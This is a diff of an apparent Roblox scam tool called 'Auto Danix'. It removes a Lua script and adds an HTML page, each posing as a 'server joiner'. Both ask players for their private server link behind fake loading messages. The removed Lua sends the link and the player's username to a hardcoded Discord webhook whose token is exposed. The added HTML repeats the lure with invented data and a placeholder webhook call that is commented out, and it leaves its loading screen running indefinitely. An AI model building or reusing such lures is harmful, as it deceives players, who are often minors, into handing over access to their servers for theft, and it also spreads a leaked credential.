@@ -1,222 +1,285 @@
--- Configuração do Webhook
-local WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1443019238724997261/TBUwGxEJ2MyvJ6y0PQIhNz4ErMZ0_k7Z-e7SNk-IZrA2l15O96d7gfaijQZzf7TKJ173"
-
--- Função para criar a tela inicial
-local function createInputScreen()
-    local ScreenGui = Instance.new("ScreenGui")
-    local MainFrame = Instance.new("Frame")
-    local Title = Instance.new("TextLabel")
-    local AutoDanix = Instance.new("TextLabel")
-    local InputFrame = Instance.new("Frame")
-    local TextBox = Instance.new("TextBox")
-    local ConfirmButton = Instance.new("TextButton")
-    local UICorner = Instance.new("UICorner")
-    local UIStroke = Instance.new("UIStroke")
-
-    -- Configurar a GUI
-    ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    ScreenGui.Name = "AutoDanixGUI"
-
-    -- Frame principal com tema natalino
-    MainFrame.Size = UDim2.new(0, 400, 0, 300)
-    MainFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
-    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 60, 30) -- Verde natalino
-    MainFrame.BorderSizePixel = 0
-    MainFrame.Parent = ScreenGui
-
-    -- Bordas decorativas
-    UICorner.CornerRadius = UDim.new(0, 12)
-    UICorner.Parent = MainFrame
-
-    UIStroke.Color = Color3.fromRGB(255, 0, 0) -- Vermelho natalino
-    UIStroke.Thickness = 3
-    UIStroke.Parent = MainFrame
-
-    -- Título principal
-    Title.Size = UDim2.new(1, 0, 0, 60)
-    Title.Position = UDim2.new(0, 0, 0, 20)
-    Title.BackgroundTransparency = 1
-    Title.Text = "SERVER JOINER"
-    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    Title.TextScaled = true
-    Title.Font = Enum.Font.FredokaOne
-    Title.Parent = MainFrame
-
-    -- Subtítulo Auto Danix
-    AutoDanix.Size = UDim2.new(1, 0, 0, 30)
-    AutoDanix.Position = UDim2.new(0, 0, 0, 80)
-    AutoDanix.BackgroundTransparency = 1
-    AutoDanix.Text = "AUTO DANIX"
-    AutoDanix.TextColor3 = Color3.fromRGB(255, 215, 0) -- Dourado
-    AutoDanix.TextScaled = true
-    AutoDanix.Font = Enum.Font.GothamBold
-    AutoDanix.Parent = MainFrame
-
-    -- Frame do input
-    InputFrame.Size = UDim2.new(0, 300, 0, 120)
-    InputFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
-    InputFrame.BackgroundTransparency = 1
-    InputFrame.Parent = MainFrame
-
-    -- TextBox para o link
-    TextBox.Size = UDim2.new(1, 0, 0, 40)
-    TextBox.Position = UDim2.new(0, 0, 0, 0)
-    TextBox.PlaceholderText = "enter you link server"
-    TextBox.Text = ""
-    TextBox.ClearTextOnFocus = false
-    TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    TextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    TextBox.Font = Enum.Font.Gotham
-    TextBox.TextScaled = true
-    TextBox.Parent = InputFrame
-
-    local TextBoxCorner = Instance.new("UICorner")
-    TextBoxCorner.CornerRadius = UDim.new(0, 8)
-    TextBoxCorner.Parent = TextBox
-
-    -- Botão confirmar
-    ConfirmButton.Size = UDim2.new(0, 150, 0, 40)
-    ConfirmButton.Position = UDim2.new(0.5, -75, 0, 60)
-    ConfirmButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Vermelho natalino
-    ConfirmButton.Text = "CONFIRMAR"
-    ConfirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
-    ConfirmButton.TextScaled = true
-    ConfirmButton.Font = Enum.Font.GothamBold
-    ConfirmButton.Parent = InputFrame
-
-    local ConfirmCorner = Instance.new("UICorner")
-    ConfirmCorner.CornerRadius = UDim.new(0, 8)
-    ConfirmCorner.Parent = ConfirmButton
-
-    -- Função do botão confirmar
-    ConfirmButton.MouseButton1Click:Connect(function()
-        local serverLink = TextBox.Text
+        <!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Danix</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
         
-        -- Enviar informações para o webhook
-        sendLinkToWebhook(serverLink)
+        body {
+            background: linear-gradient(135deg, #1a2a3a, #0d1b2a);
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
         
-        -- Fechar tela atual
-        ScreenGui:Destroy()
+        .container {
+            width: 100%;
+            max-width: 500px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
         
-        -- Criar tela de carregamento
-        createLoadingScreen()
-    end)
-
-    return ScreenGui
-end
-
--- Função para enviar o link para o webhook
-local function sendLinkToWebhook(serverLink)
-    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
-    local player = game.Players.LocalPlayer
-    local playerName = player.Name
-    
-    local payload = {
-        embeds = {{
-            title = "🔗 NOVO LINK RECEBIDO - AUTO DANIX",
-            color = 0x00FF00,
-            fields = {
-                {
-                    name = "👤 Nome do Jogador:",
-                    value = playerName,
-                    inline = true
-                },
-                {
-                    name = "⏰ Data/Hora:",
-                    value = currentTime,
-                    inline = true
-                },
-                {
-                    name = "🔗 Link do Servidor:",
-                    value = serverLink,
-                    inline = false
-                }
-            },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-        }}
-    }
-    
-    -- Enviar para webhook
-    local success, result = pcall(function()
-        return game:GetService("HttpService"):PostAsync(
-            WEBHOOK_URL,
-            game:GetService("HttpService"):JSONEncode(payload)
-        )
-    end)
-    
-    if success then
-        print("✅ Link enviado para webhook!")
-    else
-        warn("❌ Erro ao enviar para webhook: " .. tostring(result))
-    end
-end
-
--- Função para criar tela de carregamento
-local function createLoadingScreen()
-    local LoadingGui = Instance.new("ScreenGui")
-    local LoadingFrame = Instance.new("Frame")
-    local LoadingText = Instance.new("TextLabel")
-    local MessagesFrame = Instance.new("Frame")
-    local UICorner = Instance.new("UICorner")
-    
-    LoadingGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-    LoadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    
-    -- Frame de carregamento
-    LoadingFrame.Size = UDim2.new(0, 500, 0, 300)
-    LoadingFrame.Position = UDim2.new(0.5, -250, 0.5, -150)
-    LoadingFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
-    LoadingFrame.BorderSizePixel = 0
-    LoadingFrame.Parent = LoadingGui
-    
-    UICorner.CornerRadius = UDim.new(0, 12)
-    UICorner.Parent = LoadingFrame
-    
-    -- Texto principal
-    LoadingText.Size = UDim2.new(1, 0, 0, 60)
-    LoadingText.Position = UDim2.new(0, 0, 0, 20)
-    LoadingText.BackgroundTransparency = 1
-    LoadingText.Text = "CARREGANDO..."
-    LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
-    LoadingText.TextScaled = true
-    LoadingText.Font = Enum.Font.GothamBold
-    LoadingText.Parent = LoadingFrame
-    
-    -- Frame das mensagens
-    MessagesFrame.Size = UDim2.new(0, 400, 0, 180)
-    MessagesFrame.Position = UDim2.new(0.5, -200, 0.5, -70)
-    MessagesFrame.BackgroundTransparency = 1
-    MessagesFrame.Parent = LoadingFrame
-    
-    -- Mensagens sequenciais
-    local messages = {
-        "VERIFICANDO BASE...",
-        "BUSCADOR JOGADORES...", 
-        "VERIFICANDO SE TEM BRAINROT DE 15M+ NA BASE...",
-        "PUXANDO PLAY PRO SERVIDOR..."
-    }
-    
-    -- Mostrar mensagens sequencialmente
-    for i, message in ipairs(messages) do
-        wait(2) -- Espera 2 segundos entre cada mensagem
+        .title {
+            text-align: center;
+            margin-bottom: 30px;
+        }
         
-        local msgLabel = Instance.new("TextLabel")
-        msgLabel.Size = UDim2.new(1, 0, 0, 30)
-        msgLabel.Position = UDim2.new(0, 0, 0, (i-1) * 35)
-        msgLabel.BackgroundTransparency = 1
-        msgLabel.Text = "✓ " .. message
-        msgLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
-        msgLabel.TextScaled = true
-        msgLabel.Font = Enum.Font.Gotham
-        msgLabel.TextXAlignment = Enum.TextXAlignment.Left
-        msgLabel.Parent = MessagesFrame
-    end
+        .title h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            color: #4CAF50;
+        }
+        
+        .title p {
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+        
+        .input-group {
+            margin-bottom: 25px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 8px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+        
+        .input-group input:focus {
+            outline: none;
+            border-color: #4CAF50;
+            box-shadow: 0 0 0 2px rgba(76, 175, 80, 0.2);
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .btn:hover {
+            background: #45a049;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #1a2a3a, #0d1b2a);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loading-screen.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .loading-logo {
+            width: 120px;
+            height: 120px;
+            margin-bottom: 30px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #4CAF50, #2196F3);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 3rem;
+            animation: pulse 2s infinite;
+        }
+        
+        .loading-text {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            color: #4CAF50;
+            font-weight: 700;
+        }
+        
+        .loading-bar {
+            width: 300px;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 20px;
+        }
+        
+        .loading-progress {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #4CAF50, #2196F3);
+            animation: loading 2s infinite;
+        }
+        
+        .loading-info {
+            text-align: center;
+            opacity: 0.7;
+            max-width: 80%;
+            line-height: 1.5;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+        
+        @keyframes loading {
+            0% { width: 0%; }
+            50% { width: 70%; }
+            100% { width: 100%; }
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainScreen">
+        <div class="title">
+            <h1>🎄 Auto Danix</h1>
+            <p>Link do servidor privado</p>
+        </div>
+        
+        <div class="input-group">
+            <label for="serverLink">Insira o link do Roblox</label>
+            <input type="text" id="serverLink" placeholder="https://www.roblox.com/games/...">
+        </div>
+        
+        <button class="btn" id="confirmBtn">CONFIRMAR</button>
+    </div>
     
-    -- Fechar tudo após mostrar todas as mensagens
-    wait(3)
-    LoadingGui:Destroy()
-end
+    <div class="loading-screen" id="loadingScreen">
+        <div class="loading-logo">D</div>
+        <div class="loading-text">MÉTODO DANIX</div>
+        <div class="loading-bar">
+            <div class="loading-progress"></div>
+        </div>
+        <div class="loading-info">Carregando informações do servidor...</div>
+    </div>
 
--- Iniciar a tela inicial
-createInputScreen()
+    <script>
+        document.getElementById('confirmBtn').addEventListener('click', function() {
+            const serverLink = document.getElementById('serverLink').value;
+            
+            if (!serverLink) {
+                alert('Por favor, insira o link do servidor Roblox.');
+                return;
+            }
+            
+            // Mostrar tela de carregamento
+            document.getElementById('loadingScreen').classList.add('active');
+            document.getElementById('mainScreen').classList.add('hidden');
+            
+            // Simular coleta de informações (em um caso real, isso seria feito com APIs)
+            setTimeout(() => {
+                // Coletar informações fictícias para demonstração
+                const playerName = "Jogador_" + Math.floor(Math.random() * 1000);
+                const brainrotCount = Math.floor(Math.random() * 50) + 1;
+                const playerCount = Math.floor(Math.random() * 100) + 10;
+                
+                // Enviar para webhook (substitua pela URL real do seu webhook)
+                sendToWebhook(playerName, brainrotCount, playerCount, serverLink);
+            }, 2000);
+        });
+        
+        function sendToWebhook(playerName, brainrotCount, playerCount, serverLink) {
+            // Substitua pela URL real do seu webhook
+            const webhookURL = "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI";
+            
+            const data = {
+                content: null,
+                embeds: [
+                    {
+                        title: "Auto Danix - Informações Coletadas",
+                        color: 3066993,
+                        fields: [
+                            {
+                                name: "Nome do Jogador",
+                                value: playerName,
+                                inline: true
+                            },
+                            {
+                                name: "Brainrot na Base",
+                                value: brainrotCount.toString(),
+                                inline: true
+                            },
+                            {
+                                name: "Pessoas no Servidor",
+                                value: playerCount.toString(),
+                                inline: true
+                            },
+                            {
+                                name: "Link do Servidor",
+                                value: serverLink
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }
+                ]
+            };
+            
+            // Em um ambiente real, você enviaria para o webhook
+            // fetch(webhookURL, {
+            //     method: 'POST',
+            //     headers: {
+            //         'Content-Type': 'application/json',
+            //     },
+            //     body: JSON.stringify(data),
+            // })
+            // .then(response => console.log('Dados enviados com sucesso'))
+            // .catch(error => console.error('Erro ao enviar dados:', error));
+            
+            // Para demonstração, apenas exibimos no console
+            console.log("Dados que seriam enviados para o webhook:");
+            console.log(data);
+            
+            // A tela de carregamento permanece ativa infinitamente conforme solicitado
+        }
+    </script>
+</body>
+</html>
